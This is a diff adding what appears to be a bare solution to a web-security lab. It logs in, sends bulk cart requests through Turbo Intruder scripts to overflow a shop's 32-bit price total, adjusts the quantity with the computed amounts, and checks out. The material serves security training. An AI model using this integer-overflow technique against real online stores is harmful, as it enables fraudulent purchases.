@@ -1,0 +1,73 @@
+POST /login HTTP/1.1
+
+csrf=XYcd7rrEmxyI2kH81km0bPIpDiDyO9Vm&username=wiener&password=peter
+
+GET /my-account HTTP/1.1
+
+$ echo $((2 ** 32 / 2 / 1337 / 99 / 100))
+
+POST /cart HTTP/1.1
+
+productId=1&redir=PRODUCT&quantity=99
+
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=1,
+                           pipeline=False
+                           )
+
+    for _ in range(162):
+        engine.queue(target.req)
+
+
+def handleResponse(req, interesting):
+    # currently available attributes are req.status, req.wordcount, req.length and req.response
+    if req.status != 404:
+        table.add(req)
+
+
+$ echo $((2 ** 32 / 2))
+
+$ echo $(((2147483648 - 2144280600) / 133700 + 1))
+
+POST /cart HTTP/1.1
+
+productId=1&quantity=24&redir=CART
+
+$ echo $((2 ** 32 / 2 / 86.33 / 99 / 100))
+
+POST /cart HTTP/1.1
+
+productId=3&redir=PRODUCT&quantity=99
+
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=1,
+                           pipeline=False
+                           )
+
+    for _ in range(2512):
+        engine.queue(target.req)
+
+
+def handleResponse(req, interesting):
+    # currently available attributes are req.status, req.wordcount, req.length and req.response
+    if req.status != 404:
+        table.add(req)
+
+
+$ echo $((5543.92 / 86.33 + 1))
+
+POST /cart HTTP/1.1
+
+productId=3&quantity=65&redir=CART
+
+POST /cart/checkout HTTP/1.1
+
+csrf=y39dIOABuYRDRUTbNGQFmOhkpRlZPgkJ
+
+GET /cart/order-confirmation?order-confirmed=true HTTP/1.1
